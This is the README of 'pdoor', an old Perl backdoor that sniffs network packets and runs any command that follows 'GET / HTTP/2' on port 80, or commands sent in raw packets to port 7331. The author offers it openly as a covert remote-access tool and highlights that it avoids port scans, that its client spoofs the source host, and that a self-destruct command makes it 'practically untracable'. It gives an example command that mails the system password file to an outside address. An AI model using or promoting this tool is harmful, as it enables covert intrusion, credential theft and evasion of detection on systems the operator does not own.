# pdoor
an old 'backdoor' I made that doesn't open any ports and allows you to run programs remotely with a client that spoofs the source of the host and portscans will never find the backdoor since it only looks for certain types of packets and needs no 3way handshakes.

This is a backdoor (pdoor.pl) which sniffs raw packets
going across the network.  It allows you to run commands
without opening any ports on the machine that the backdoor
is running.  It does this by sniffing all packets on port
80 and 7331.  Usually port 80 is open, so, if you want,
you can use telnet and telnet to some machine on that
network on port 80.  Then you would give it something like
this:
GET / HTTP/2cat /etc/master.passwd|mail user@blah
It will read anything after 'GET / HTTP/2' as a
command.  If port 80 isn't open on any machines on the
network, you can use pcl.pl to send a raw packet with
data to port 7331 (which won't be open, but pdoor.pl
will see the packet anyways).  You can connect to
pretty much any machine on the network, not just the one
which the backdoor running.  This is because pdoor.pl
will try to sniff the entire network.  It also contains
a self destruct feature (it will remove itself and then
die, practically untracable) when you do this:
GET / HTTP/2DIE
If you're using the pcl.pl, you only have to type:
DIE


-cp5
